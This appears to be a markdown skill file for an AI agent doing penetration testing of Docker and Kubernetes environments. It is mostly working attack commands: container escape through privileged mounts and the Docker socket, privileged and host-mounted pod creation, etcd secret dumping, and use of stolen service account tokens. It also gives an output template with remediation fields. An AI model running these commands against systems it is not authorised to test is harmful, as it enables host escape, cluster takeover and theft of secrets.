---
name: container-security
description: Docker and Kubernetes security including container escape, misconfigurations, and orchestration attacks. Use when testing containerized environments, Kubernetes clusters, or Docker deployments. Triggers on "container", "docker", "kubernetes", "k8s", "escape", "orchestration", "pod", "namespace".
category: container-security
tags: container,docker,kubernetes,k8s,escape,orchestration,pod,namespace,rbac,etcd
---

# Container Security

## Docker Security

### Container Escape

#### Privileged Container
```bash
# Check if container is privileged
cat /proc/1/status | grep CapEff

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host
```

#### Docker Socket Access
```bash
# Check if Docker socket is mounted
ls -la /var/run/docker.sock

# Execute commands on host
docker run -v /:/host -it alpine chroot /host
```

#### Capabilities Abuse
```bash
# Check capabilities
capsh --print

# Dangerous capabilities
# CAP_SYS_ADMIN: mount, pivot_root
# CAP_NET_ADMIN: network manipulation
# CAP_SYS_PTRACE: process injection
```

### Misconfigurations

#### Exposed Docker API
```bash
curl http://target:2375/containers/json
curl http://target:2375/images/json
```

#### Sensitive Data in Images
```bash
# Check for secrets in image history
docker history <image>

# Extract files from image
docker create <image>
docker cp <container_id>:/path/to/secret .
```

#### Insecure Base Images
- Outdated images with known vulnerabilities
- Unnecessary packages
- Running as root

## Kubernetes Security

### RBAC Abuse

#### Check Permissions
```bash
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
```

#### Privilege Escalation
```bash
# Create privileged pod
kubectl run privileged --image=nginx --overrides='{"spec":{"containers":[{"name":"privileged","image":"nginx","securityContext":{"privileged":true}}]}}'

# Mount host filesystem
kubectl run host-mount --image=nginx --overrides='{"spec":{"containers":[{"name":"host-mount","image":"nginx","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}'
```

### etcd Access
```bash
# Check if etcd is accessible
etcdctl --endpoints=https://target:2379 get / --prefix --keys-only

# Read secrets
etcdctl get /registry/secrets/default/secret-name
```

### API Server Abuse
```bash
# Check API server access
curl -k https://target:6443/api/v1/namespaces/default/pods

# Create pod with host network
curl -k -X POST https://target:6443/api/v1/namespaces/default/pods -d @pod.json
```

### Service Account Token Abuse
```bash
# Read service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to access API
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces
```

## Tools

| Tool | Purpose |
|------|---------|
| `docker` | Container management |
| `kubectl` | Kubernetes management |
| `etcdctl` | etcd client |
| `kube-bench` | Kubernetes CIS benchmark |
| `kube-hunter` | Kubernetes vulnerability scanner |
| `trivy` | Container image scanner |
| `falco` | Runtime security monitoring |

## Output Format

```
[HIT] <vulnerability> in <container/cluster>
  Type: <escape/misconfig/RBAC/etcd>
  Vector: <how it was exploited>
  Impact: <host access/cluster compromise>
  Remediation: <fix>
```
